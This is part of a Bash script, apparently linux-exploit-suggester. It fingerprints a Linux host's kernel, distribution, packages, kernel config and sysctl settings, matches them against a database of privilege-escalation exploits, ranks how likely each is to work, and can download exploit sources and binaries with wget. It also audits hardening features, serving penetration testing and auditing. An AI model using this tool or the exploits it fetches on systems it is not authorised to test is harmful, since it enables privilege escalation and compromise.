        elif [ "$(grep -E '\.fc[1-9]+'i "$pkglist_file" | head -1)" ]; then
            PKG_LIST=$(cat "$pkglist_file")
            OS="fedora"
        # mageia package listing file
        elif [ "$(grep -E '\.mga[1-9]+' "$pkglist_file" | head -1)" ]; then
            PKG_LIST=$(cat "$pkglist_file")
            OS="mageia"
        # pacman package listing file
        elif [ "$(grep -E '\ [0-9]+\.' "$pkglist_file" | head -1)" ]; then
            PKG_LIST=$(cat "$pkglist_file" | awk '{print $1"-"$2}')
            OS="arch"
        # file not recognized - skipping
        else
            PKG_LIST=""
        fi

    elif [ "$distro" = "debian" -o "$distro" = "ubuntu" -o "$distro" = "deepin" ]; then
        PKG_LIST=$(dpkg -l | awk '{print $2"-"$3}' | sed 's/:amd64//g')
    elif [ "$distro" = "RHEL" -o "$distro" = "fedora" -o "$distro" = "mageia" ]; then
        PKG_LIST=$(rpm -qa)
    elif [ "$distro" = "arch" -o "$distro" = "manjaro" ]; then
        PKG_LIST=$(pacman -Q | awk '{print $1"-"$2}')
    elif [ -x /usr/bin/equery ]; then
        PKG_LIST=$(/usr/bin/equery --quiet list '*' -F '$name:$version' | cut -d/ -f2- | awk '{print $1":"$2}')
    else
        # packages listing not available
        PKG_LIST=""
    fi
}

# from: https://stackoverflow.com/questions/4023830/how-compare-two-strings-in-dot-separated-version-format-in-bash
verComparision() {

    if [[ $1 == $2 ]]
    then
        return 0
    fi

    local IFS=.
    local i ver1=($1) ver2=($2)

    # fill empty fields in ver1 with zeros
    for ((i=${#ver1[@]}; i<${#ver2[@]}; i++))
    do
        ver1[i]=0
    done

    for ((i=0; i<${#ver1[@]}; i++))
    do
        if [[ -z ${ver2[i]} ]]
        then
            # fill empty fields in ver2 with zeros
            ver2[i]=0
        fi
        if ((10#${ver1[i]} > 10#${ver2[i]}))
        then
            return 1
        fi
        if ((10#${ver1[i]} < 10#${ver2[i]}))
        then
            return 2
        fi
    done

    return 0
}

doVersionComparision() {
    local reqVersion="$1"
    local reqRelation="$2"
    local currentVersion="$3"

    verComparision $currentVersion $reqVersion
    case $? in
        0) currentRelation='=';;
        1) currentRelation='>';;
        2) currentRelation='<';;
    esac

    if [ "$reqRelation" == "=" ]; then
        [ $currentRelation == "=" ] && return 0
    elif [ "$reqRelation" == ">" ]; then
        [ $currentRelation == ">" ] && return 0
    elif [ "$reqRelation" == "<" ]; then
        [ $currentRelation == "<" ] && return 0
    elif [ "$reqRelation" == ">=" ]; then
        [ $currentRelation == "=" ] && return 0
        [ $currentRelation == ">" ] && return 0
    elif [ "$reqRelation" == "<=" ]; then
        [ $currentRelation == "=" ] && return 0
        [ $currentRelation == "<" ] && return 0
    fi
}

compareValues() {
    curVal=$1
    val=$2
    sign=$3

    if [ "$sign" == "==" ]; then
        [ "$val" == "$curVal" ] && return 0
    elif [ "$sign" == "!=" ]; then
        [ "$val" != "$curVal" ] && return 0
    fi

    return 1
}

checkRequirement() {
    #echo "Checking requirement: $1"
    local IN="$1"
    local pkgName="${2:4}"

    if [[ "$IN" =~ ^pkg=.*$ ]]; then

        # always true for Linux OS
        [ ${pkgName} == "linux-kernel" ] && return 0

        # verify if package is present 
        pkg=$(echo "$PKG_LIST" | grep -E -i "^$pkgName-[0-9]+" | head -1)
        if [ -n "$pkg" ]; then
            return 0
        fi

    elif [[ "$IN" =~ ^ver.*$ ]]; then
        version="${IN//[^0-9.]/}"
        rest="${IN#ver}"
        operator=${rest%$version}

        if [ "$pkgName" == "linux-kernel" -o "$opt_checksec_mode" == "true" ]; then

            # for --cvelist-file mode skip kernel version comparision
            [ "$opt_cvelist_file" = "true" ] && return 0

            doVersionComparision $version $operator $KERNEL && return 0
        else
            # extract package version and check if requiremnt is true
            pkg=$(echo "$PKG_LIST" | grep -E -i "^$pkgName-[0-9]+" | head -1)

            # skip (if run with --skip-pkg-versions) version checking if package with given name is installed
            [ "$opt_skip_pkg_versions" = "true" -a -n "$pkg" ] && return 0

            # versioning:
            #echo "pkg: $pkg"
            pkgVersion=$(echo "$pkg" | grep -E -i -o -e '-[\.0-9\+:p]+[-\+]' | cut -d':' -f2 | sed 's/[\+-]//g' | sed 's/p[0-9]//g')
            #echo "version: $pkgVersion"
            #echo "operator: $operator"
            #echo "required version: $version"
            #echo
            doVersionComparision $version $operator $pkgVersion && return 0
        fi
    elif [[ "$IN" =~ ^x86_64$ ]] && [ "$ARCH" == "x86_64" -o "$ARCH" == "" ]; then
        return 0
    elif [[ "$IN" =~ ^x86$ ]] && [ "$ARCH" == "i386" -o "$ARCH" == "i686" -o "$ARCH" == "" ]; then
        return 0
    elif [[ "$IN" =~ ^CONFIG_.*$ ]]; then

        # skip if check is not applicable (-k or --uname or -p set) or if user said so (--skip-more-checks)
        [ "$opt_skip_more_checks" = "true" ] && return 0

        # if kernel config IS available:
        if [ -n "$KCONFIG" ]; then
            if $KCONFIG | grep -E -qi $IN; then
                return 0;
            # required option wasn't found, exploit is not applicable
            else
                return 1;
            fi
        # config is not available
        else
            return 0;
        fi
    elif [[ "$IN" =~ ^sysctl:.*$ ]]; then

        # skip if check is not applicable (-k or --uname or -p modes) or if user said so (--skip-more-checks)
        [ "$opt_skip_more_checks" = "true" ] && return 0

        sysctlCondition="${IN:7}"

        # extract sysctl entry, relation sign and required value
        if echo $sysctlCondition | grep -qi "!="; then
            sign="!="
        elif echo $sysctlCondition | grep -qi "=="; then
            sign="=="
        else
            exitWithErrMsg "Wrong sysctl condition. There is syntax error in your features DB. Aborting."
        fi
        val=$(echo "$sysctlCondition" | awk -F "$sign" '{print $2}')
        entry=$(echo "$sysctlCondition" | awk -F "$sign" '{print $1}')

        # get current setting of sysctl entry
        curVal=$(/sbin/sysctl -a 2> /dev/null | grep "$entry" | awk -F'=' '{print $2}')

        # special case for --checksec mode: return 2 if there is no such switch in sysctl
        [ -z "$curVal" -a "$opt_checksec_mode" = "true" ] && return 2

        # for other modes: skip if there is no such switch in sysctl
        [ -z "$curVal" ] && return 0

        # compare & return result
        compareValues $curVal $val $sign && return 0

    elif [[ "$IN" =~ ^cmd:.*$ ]]; then

        # skip if check is not applicable (-k or --uname or -p modes) or if user said so (--skip-more-checks)
        [ "$opt_skip_more_checks" = "true" ] && return 0

        cmd="${IN:4}"
        if eval "${cmd}"; then
            return 0
        fi
    fi

    return 1
}

getKernelConfig() {

    if [ -f /proc/config.gz ] ; then
        KCONFIG="zcat /proc/config.gz"
    elif [ -f /boot/config-`uname -r` ] ; then
        KCONFIG="cat /boot/config-`uname -r`"
    elif [ -f "${KBUILD_OUTPUT:-/usr/src/linux}"/.config ] ; then
        KCONFIG="cat ${KBUILD_OUTPUT:-/usr/src/linux}/.config"
    else
        KCONFIG=""
    fi
}

checksecMode() {

    MODE=0

    # start analysis
for FEATURE in "${FEATURES[@]}"; do

    # create array from current exploit here doc and fetch needed lines
    i=0
    # ('-r' is used to not interpret backslash used for bash colors)
    while read -r line
    do
        arr[i]="$line"
        i=$((i + 1))
    done <<< "$FEATURE"

	# modes: kernel-feature (1) | hw-feature (2) | 3rdparty-feature (3) | attack-surface (4)
    NAME="${arr[0]}"
    PRE_NAME="${NAME:0:8}"
    NAME="${NAME:9}"
    if [ "${PRE_NAME}" = "section:" ]; then
		# advance to next MODE
		MODE=$(($MODE + 1))

        echo
        echo -e "${bldwht}${NAME}${txtrst}"
        echo
        continue
    fi

    AVAILABLE="${arr[1]}" && AVAILABLE="${AVAILABLE:11}"
    ENABLE=$(echo "$FEATURE" | grep "enabled: " | awk -F'ed: ' '{print $2}')
    analysis_url=$(echo "$FEATURE" | grep "analysis-url: " | awk '{print $2}')

    # split line with availability requirements & loop thru all availability reqs one by one & check whether it is met
    IFS=',' read -r -a array <<< "$AVAILABLE"
    AVAILABLE_REQS_NUM=${#array[@]}
    AVAILABLE_PASSED_REQ=0
	CONFIG=""
    for REQ in "${array[@]}"; do

		# find CONFIG_ name (if present) for current feature (only for display purposes)
		if [ -z "$CONFIG" ]; then
			config=$(echo "$REQ" | grep "CONFIG_")
			[ -n "$config" ] && CONFIG="($(echo $REQ | cut -d'=' -f1))"
		fi

        if (checkRequirement "$REQ"); then
            AVAILABLE_PASSED_REQ=$(($AVAILABLE_PASSED_REQ + 1))
        else
            break
        fi
    done

    # split line with enablement requirements & loop thru all enablement reqs one by one & check whether it is met
    ENABLE_PASSED_REQ=0
    ENABLE_REQS_NUM=0
    noSysctl=0
    if [ -n "$ENABLE" ]; then
        IFS=',' read -r -a array <<< "$ENABLE"
        ENABLE_REQS_NUM=${#array[@]}
        for REQ in "${array[@]}"; do
            cmdStdout=$(checkRequirement "$REQ")
            retVal=$?
            if [ $retVal -eq 0 ]; then
                ENABLE_PASSED_REQ=$(($ENABLE_PASSED_REQ + 1))
            elif [ $retVal -eq 2 ]; then
            # special case: sysctl entry is not present on given system: signal it as: N/A
                noSysctl=1
                break
            else
                break
            fi
        done
    fi

    feature=$(echo "$FEATURE" | grep "feature: " | cut -d' ' -f 2-)

	if [ -n "$cmdStdout" ]; then
        if [ "$cmdStdout" -eq 0 ]; then
            state="[ ${txtred}Set to $cmdStdout${txtrst} ]"
			cmdStdout=""
        else
            state="[ ${txtgrn}Set to $cmdStdout${txtrst} ]"
			cmdStdout=""
        fi
    else

	unknown="[ ${txtgray}Unknown${txtrst}  ]"

	# for 3rd party (3) mode display "N/A" or "Enabled"
	if [ $MODE -eq 3 ]; then
        enabled="[ ${txtgrn}Enabled${txtrst}   ]"
        disabled="[   ${txtgray}N/A${txtrst}    ]"

    # for attack-surface (4) mode display "Locked" or "Exposed"
    elif [ $MODE -eq 4 ]; then
       enabled="[ ${txtred}Exposed${txtrst}  ]"
       disabled="[ ${txtgrn}Locked${txtrst}   ]"

	#other modes" "Disabled" / "Enabled"
	else
		enabled="[ ${txtgrn}Enabled${txtrst}  ]"
		disabled="[ ${txtred}Disabled${txtrst} ]"
	fi

	if [ -z "$KCONFIG" -a "$ENABLE_REQS_NUM" = 0 ]; then
	    state=$unknown
    elif [ $AVAILABLE_PASSED_REQ -eq $AVAILABLE_REQS_NUM -a $ENABLE_PASSED_REQ -eq $ENABLE_REQS_NUM ]; then
        state=$enabled
    else
        state=$disabled
	fi

    fi

    echo -e " $state $feature ${wht}${CONFIG}${txtrst}"
    [ -n "$analysis_url" ] && echo -e "              $analysis_url"
    echo

done

}

displayExposure() {
    RANK=$1

    if [ "$RANK" -ge 6 ]; then
        echo "highly probable"
    elif [ "$RANK" -ge 3 ]; then
        echo "probable"
    else
        echo "less probable"
    fi
}

# parse command line parameters
ARGS=$(getopt --options $SHORTOPTS  --longoptions $LONGOPTS -- "$@")
[ $? != 0 ] && exitWithErrMsg "Aborting."

eval set -- "$ARGS"

while true; do
    case "$1" in
        -u|--uname)
            shift
            UNAME_A="$1"
            opt_uname_string=true
            ;;
        -V|--version)
            version
            exit 0
            ;;
        -h|--help)
            usage 
            exit 0
            ;;
        -f|--full)
            opt_full=true
            ;;
        -g|--short)
            opt_summary=true
            ;;
        -b|--fetch-binaries)
            opt_fetch_bins=true
            ;;
        -s|--fetch-sources)
            opt_fetch_srcs=true
            ;;
        -k|--kernel)
            shift
            KERNEL="$1"
            opt_kernel_version=true
            ;;
        -d|--show-dos)
            opt_show_dos=true
            ;;
        -p|--pkglist-file)
            shift
            PKGLIST_FILE="$1"
            opt_pkglist_file=true
            ;;
        --cvelist-file)
            shift
            CVELIST_FILE="$1"
            opt_cvelist_file=true
            ;;
        --checksec)
            opt_checksec_mode=true
            ;;
        --kernelspace-only)
            opt_kernel_only=true
            ;;
        --userspace-only)
            opt_userspace_only=true
            ;;
        --skip-more-checks)
            opt_skip_more_checks=true
            ;;
        --skip-pkg-versions)
            opt_skip_pkg_versions=true
            ;;
        *)
            shift
            if [ "$#" != "0" ]; then
                exitWithErrMsg "Unknown option '$1'. Aborting."
            fi
            break
            ;;
    esac
    shift
done

# check Bash version (associative arrays need Bash in version 4.0+)
if ((BASH_VERSINFO[0] < 4)); then
    exitWithErrMsg "Script needs Bash in version 4.0 or newer. Aborting."
fi

# exit if both --kernel and --uname are set
[ "$opt_kernel_version" = "true" ] && [ $opt_uname_string = "true" ] && exitWithErrMsg "Switches -u|--uname and -k|--kernel are mutually exclusive. Aborting."

# exit if both --full and --short are set
[ "$opt_full" = "true" ] && [ $opt_summary = "true" ] && exitWithErrMsg "Switches -f|--full and -g|--short are mutually exclusive. Aborting."

# --cvelist-file mode is standalone mode and is not applicable when one of -k | -u | -p | --checksec switches are set
if [ "$opt_cvelist_file" = "true" ]; then
    [ ! -e "$CVELIST_FILE" ] && exitWithErrMsg "Provided CVE list file does not exists. Aborting."
    [ "$opt_kernel_version" = "true" ] && exitWithErrMsg "Switches -k|--kernel and --cvelist-file are mutually exclusive. Aborting."
    [ "$opt_uname_string" = "true" ] && exitWithErrMsg "Switches -u|--uname and --cvelist-file are mutually exclusive. Aborting."
    [ "$opt_pkglist_file" = "true" ] && exitWithErrMsg "Switches -p|--pkglist-file and --cvelist-file are mutually exclusive. Aborting."
fi

# --checksec mode is standalone mode and is not applicable when one of -k | -u | -p | --cvelist-file switches are set
if [ "$opt_checksec_mode" = "true" ]; then
    [ "$opt_kernel_version" = "true" ] && exitWithErrMsg "Switches -k|--kernel and --checksec are mutually exclusive. Aborting."
    [ "$opt_uname_string" = "true" ] && exitWithErrMsg "Switches -u|--uname and --checksec are mutually exclusive. Aborting."
    [ "$opt_pkglist_file" = "true" ] && exitWithErrMsg "Switches -p|--pkglist-file and --checksec are mutually exclusive. Aborting."
fi

# extract kernel version and other OS info like distro name, distro version, etc. 3 possibilities here:
# case 1: --kernel set
if [ "$opt_kernel_version" == "true" ]; then
    # TODO: add kernel version number validation
    [ -z "$KERNEL" ] && exitWithErrMsg "Unrecognized kernel version given. Aborting."
    ARCH=""
    OS=""

    # do not perform additional checks on current machine
    opt_skip_more_checks=true

    # do not consider current OS
    getPkgList "" "$PKGLIST_FILE"

# case 2: --uname set
elif [ "$opt_uname_string" == "true" ]; then
    [ -z "$UNAME_A" ] && exitWithErrMsg "uname string empty. Aborting."
    parseUname "$UNAME_A"

    # do not perform additional checks on current machine
    opt_skip_more_checks=true

    # do not consider current OS
    getPkgList "" "$PKGLIST_FILE"

# case 3: --cvelist-file mode
elif [ "$opt_cvelist_file" = "true" ]; then

    # get kernel configuration in this mode
    [ "$opt_skip_more_checks" = "false" ] && getKernelConfig

# case 4: --checksec mode
elif [ "$opt_checksec_mode" = "true" ]; then

    # this switch is not applicable in this mode
    opt_skip_more_checks=false

    # get kernel configuration in this mode
    getKernelConfig
    [ -z "$KCONFIG" ] && echo "WARNING. Kernel Config not found on the system results won't be complete."

    # launch checksec mode
    checksecMode

    exit 0

# case 5: no --uname | --kernel | --cvelist-file | --checksec set
else

    # --pkglist-file NOT provided: take all info from current machine
    # case for vanilla execution: ./linux-exploit-suggester.sh
    if [ "$opt_pkglist_file" == "false" ]; then
        UNAME_A=$(uname -a)
        [ -z "$UNAME_A" ] && exitWithErrMsg "uname string empty. Aborting."
        parseUname "$UNAME_A"

        # get kernel configuration in this mode
        [ "$opt_skip_more_checks" = "false" ] && getKernelConfig

        # extract distribution version from /etc/os-release OR /etc/lsb-release
        [ -n "$OS" -a "$opt_skip_more_checks" = "false" ] && DISTRO=$(grep -s -E '^DISTRIB_RELEASE=|^VERSION_ID=' /etc/*-release | cut -d'=' -f2 | head -1 | tr -d '"')

        # extract package listing from current OS
        getPkgList "$OS" ""

    # --pkglist-file provided: only consider userspace exploits against provided package listing
    else
        KERNEL=""
        #TODO: extract machine arch from package listing
        ARCH=""
        unset EXPLOITS
        declare -A EXPLOITS
        getPkgList "" "$PKGLIST_FILE"

        # additional checks are not applicable for this mode
        opt_skip_more_checks=true
    fi
fi

echo
echo -e "${bldwht}Available information:${txtrst}"
echo
[ -n "$KERNEL" ] && echo -e "Kernel version: ${txtgrn}$KERNEL${txtrst}" || echo -e "Kernel version: ${txtred}N/A${txtrst}"
echo "Architecture: $([ -n "$ARCH" ] && echo -e "${txtgrn}$ARCH${txtrst}" || echo -e "${txtred}N/A${txtrst}")"
echo "Distribution: $([ -n "$OS" ] && echo -e "${txtgrn}$OS${txtrst}" || echo -e "${txtred}N/A${txtrst}")"
echo -e "Distribution version: $([ -n "$DISTRO" ] && echo -e "${txtgrn}$DISTRO${txtrst}" || echo -e "${txtred}N/A${txtrst}")"

echo "Additional checks (CONFIG_*, sysctl entries, custom Bash commands): $([ "$opt_skip_more_checks" == "false" ] && echo -e "${txtgrn}performed${txtrst}" || echo -e "${txtred}N/A${txtrst}")"

if [ -n "$PKGLIST_FILE" -a -n "$PKG_LIST" ]; then
    pkgListFile="${txtgrn}$PKGLIST_FILE${txtrst}"
elif [ -n "$PKGLIST_FILE" ]; then
    pkgListFile="${txtred}unrecognized file provided${txtrst}"
elif [ -n "$PKG_LIST" ]; then
    pkgListFile="${txtgrn}from current OS${txtrst}"
fi

echo -e "Package listing: $([ -n "$pkgListFile" ] && echo -e "$pkgListFile" || echo -e "${txtred}N/A${txtrst}")"

# handle --kernelspacy-only & --userspace-only filter options
if [ "$opt_kernel_only" = "true" -o -z "$PKG_LIST" ]; then
    unset EXPLOITS_USERSPACE
    declare -A EXPLOITS_USERSPACE
fi

if [ "$opt_userspace_only" = "true" ]; then
    unset EXPLOITS
    declare -A EXPLOITS
fi

echo
echo -e "${bldwht}Searching among:${txtrst}"
echo
echo "${#EXPLOITS[@]} kernel space exploits"
echo "${#EXPLOITS_USERSPACE[@]} user space exploits"
echo

echo -e "${bldwht}Possible Exploits:${txtrst}"
echo

# start analysis
j=0
for EXP in "${EXPLOITS[@]}" "${EXPLOITS_USERSPACE[@]}"; do

    # create array from current exploit here doc and fetch needed lines
    i=0
    # ('-r' is used to not interpret backslash used for bash colors)
    while read -r line
    do
        arr[i]="$line"
        i=$((i + 1))
    done <<< "$EXP"

    NAME="${arr[0]}" && NAME="${NAME:6}"
    REQS="${arr[1]}" && REQS="${REQS:6}"
    TAGS="${arr[2]}" && TAGS="${TAGS:6}"
    RANK="${arr[3]}" && RANK="${RANK:6}"

    # split line with requirements & loop thru all reqs one by one & check whether it is met
    IFS=',' read -r -a array <<< "$REQS"
    REQS_NUM=${#array[@]}
    PASSED_REQ=0
    for REQ in "${array[@]}"; do
        if (checkRequirement "$REQ" "${array[0]}"); then
            PASSED_REQ=$(($PASSED_REQ + 1))
        else
            break
        fi
    done

    # execute for exploits with all requirements met
    if [ $PASSED_REQ -eq $REQS_NUM ]; then

        # additional requirement for --cvelist-file mode: check if CVE associated with the exploit is on the CVELIST_FILE
        if [ "$opt_cvelist_file" = "true" ]; then

            # extract CVE(s) associated with given exploit (also translates ',' to '|' for easy handling multiple CVEs case - via extended regex)
            cve=$(echo "$NAME" | grep '.*\[.*\].*' | cut -d 'm' -f2 | cut -d ']' -f1 | tr -d '[' | tr "," "|")
            #echo "CVE: $cve"

            # check if it's on CVELIST_FILE list, if no move to next exploit
            [ ! $(cat "$CVELIST_FILE" | grep -E "$cve") ] && continue
        fi

        # process tags and highlight those that match current OS (only for deb|ubuntu|RHEL and if we know distro version - direct mode)
        tags=""
        if [ -n "$TAGS" -a -n "$OS" ]; then
            IFS=',' read -r -a tags_array <<< "$TAGS"
            TAGS_NUM=${#tags_array[@]}

            # bump RANK slightly (+1) if we're in '--uname' mode and there's a TAG for OS from uname string
            [ "$(echo "${tags_array[@]}" | grep "$OS")" -a "$opt_uname_string" == "true" ] && RANK=$(($RANK + 1))

            for TAG in "${tags_array[@]}"; do
                tag_distro=$(echo "$TAG" | cut -d'=' -f1)
                tag_distro_num_all=$(echo "$TAG" | cut -d'=' -f2)
                # in case of tag of form: 'ubuntu=16.04{kernel:4.4.0-21} remove kernel versioning part for comparision
                tag_distro_num="${tag_distro_num_all%{*}"

                # we're in '--uname' mode OR (for normal mode) if there is distro version match
                if [ "$opt_uname_string" == "true" -o \( "$OS" == "$tag_distro" -a "$(echo "$DISTRO" | grep -E "$tag_distro_num")" \) ]; then

                    # bump current exploit's rank by 2 for distro match (and not in '--uname' mode)
                    [ "$opt_uname_string" == "false" ] && RANK=$(($RANK + 2))

                    # get name (kernel or package name) and version of kernel/pkg if provided:
                    tag_pkg=$(echo "$tag_distro_num_all" | cut -d'{' -f 2 | tr -d '}' | cut -d':' -f 1)
                    tag_pkg_num=""
                    [ $(echo "$tag_distro_num_all" | grep '{') ] && tag_pkg_num=$(echo "$tag_distro_num_all" | cut -d'{' -f 2 | tr -d '}' | cut -d':' -f 2)

                    #[ -n "$tag_pkg_num" ] && echo "tag_pkg_num: $tag_pkg_num; kernel: $KERNEL_ALL"

                    # if pkg/kernel version is not provided:
                    if [ -z "$tag_pkg_num" ]; then
                        [ "$opt_uname_string" == "false" ] && TAG="${lightyellow}[ ${TAG} ]${txtrst}"

                    # kernel version provided, check for match:
                    elif [ -n "$tag_pkg_num" -a "$tag_pkg" = "kernel" ]; then
                        if [ $(echo "$KERNEL_ALL" | grep -E "${tag_pkg_num}") ]; then
                            # kernel version matched - bold highlight
                            TAG="${yellow}[ ${TAG} ]${txtrst}"

                            # bump current exploit's rank additionally by 3 for kernel version regex match
                            RANK=$(($RANK + 3))
                        else
                            [ "$opt_uname_string" == "false" ] && TAG="${lightyellow}[ $tag_distro=$tag_distro_num ]${txtrst}{kernel:$tag_pkg_num}"
                        fi

                    # pkg version provided, check for match (TBD):
                    elif [ -n "$tag_pkg_num" -a -n "$tag_pkg"  ]; then
                        TAG="${lightyellow}[ $tag_distro=$tag_distro_num ]${txtrst}{$tag_pkg:$tag_pkg_num}"
                    fi

                fi

                # append current tag to tags list
                tags="${tags}${TAG},"
            done
            # trim ',' added by above loop
            [ -n "$tags" ] && tags="${tags%?}"
        else
            tags="$TAGS"
        fi

        # insert the matched exploit (with calculated Rank and highlighted tags) to arrary that will be sorted
        EXP=$(echo "$EXP" | sed -e '/^Name:/d' -e '/^Reqs:/d' -e '/^Tags:/d')
        exploits_to_sort[j]="${RANK}Name: ${NAME}D3L1mReqs: ${REQS}D3L1mTags: ${tags}D3L1m$(echo "$EXP" | sed -e ':a' -e 'N' -e '$!ba' -e 's/\n/D3L1m/g')"
        ((j++))
    fi
done

# sort exploits based on calculated Rank
IFS=$'\n'
SORTED_EXPLOITS=($(sort -r <<<"${exploits_to_sort[*]}"))
unset IFS

# display sorted exploits
for EXP_TEMP in "${SORTED_EXPLOITS[@]}"; do

	RANK=$(echo "$EXP_TEMP" | awk -F'Name:' '{print $1}')

	# convert entry back to canonical form
	EXP=$(echo "$EXP_TEMP" | sed 's/^[0-9]//g' | sed 's/D3L1m/\n/g')

	# create array from current exploit here doc and fetch needed lines
    i=0
    # ('-r' is used to not interpret backslash used for bash colors)
    while read -r line
    do
        arr[i]="$line"
        i=$((i + 1))
    done <<< "$EXP"

    NAME="${arr[0]}" && NAME="${NAME:6}"
    REQS="${arr[1]}" && REQS="${REQS:6}"
    TAGS="${arr[2]}" && tags="${TAGS:6}"

	EXPLOIT_DB=$(echo "$EXP" | grep "exploit-db: " | awk '{print $2}')
	analysis_url=$(echo "$EXP" | grep "analysis-url: " | awk '{print $2}')
	ext_url=$(echo "$EXP" | grep "ext-url: " | awk '{print $2}')
	comments=$(echo "$EXP" | grep "Comments: " | cut -d' ' -f 2-)
	reqs=$(echo "$EXP" | grep "Reqs: " | cut -d' ' -f 2)

	# exploit name without CVE number and without commonly used special chars
	name=$(echo "$NAME" | cut -d' ' -f 2- | tr -d ' ()/')

	src_url=$(echo "$EXP" | grep "src-url: " | awk '{print $2}')
	[ -z "$src_url" ] && [ -n "$EXPLOIT_DB" ] && src_url="https://www.exploit-db.com/download/$EXPLOIT_DB"
	[ -z "$src_url" ] && exitWithErrMsg "Both 'src-url' and 'exploit-db' entries are empty for '$NAME' exploit - fix that. Aborting."

	if [ -n "$analysis_url" ]; then
        details="$analysis_url"
	elif $(echo "$src_url" | grep -q 'www.exploit-db.com'); then
        details="https://www.exploit-db.com/exploits/$EXPLOIT_DB/"
	elif [[ "$src_url" =~ ^.*tgz|tar.gz|zip$ && -n "$EXPLOIT_DB" ]]; then
        details="https://www.exploit-db.com/exploits/$EXPLOIT_DB/"
	else
        details="$src_url"
	fi

	# skip DoS by default
	dos=$(echo "$EXP" | grep -o -i "(dos")
	[ "$opt_show_dos" == "false" ] && [ -n "$dos" ] && continue

	# handles --fetch-binaries option
	if [ $opt_fetch_bins = "true" ]; then
        for i in $(echo "$EXP" | grep "bin-url: " | awk '{print $2}'); do
            [ -f "${name}_$(basename $i)" ] && rm -f "${name}_$(basename $i)"
            wget -q -k "$i" -O "${name}_$(basename $i)"
        done
    fi

	# handles --fetch-sources option
	if [ $opt_fetch_srcs = "true" ]; then
        [ -f "${name}_$(basename $src_url)" ] && rm -f "${name}_$(basename $src_url)"
        wget -q -k "$src_url" -O "${name}_$(basename $src_url)" &
    fi

    # display result (short)
	if [ "$opt_summary" = "true" ]; then
	[ -z "$tags" ] && tags="-"
	echo -e "$NAME || $tags || $src_url"
	continue
	fi

# display result (standard)
	echo -e "[+] $NAME"
	echo -e "\n   Details: $details"
        echo -e "   Exposure: $(displayExposure $RANK)"
        [ -n "$tags" ] && echo -e "   Tags: $tags"
        echo -e "   Download URL: $src_url"
        [ -n "$ext_url" ] && echo -e "   ext-url: $ext_url"
        [ -n "$comments" ] && echo -e "   Comments: $comments"

        # handles --full filter option
        if [ "$opt_full" = "true" ]; then
            [ -n "$reqs" ] && echo -e "   Requirements: $reqs"

            [ -n "$EXPLOIT_DB" ] && echo -e "   exploit-db: $EXPLOIT_DB"

            author=$(echo "$EXP" | grep "author: " | cut -d' ' -f 2-)
            [ -n "$author" ] && echo -e "   author: $author"
        fi

        echo

done

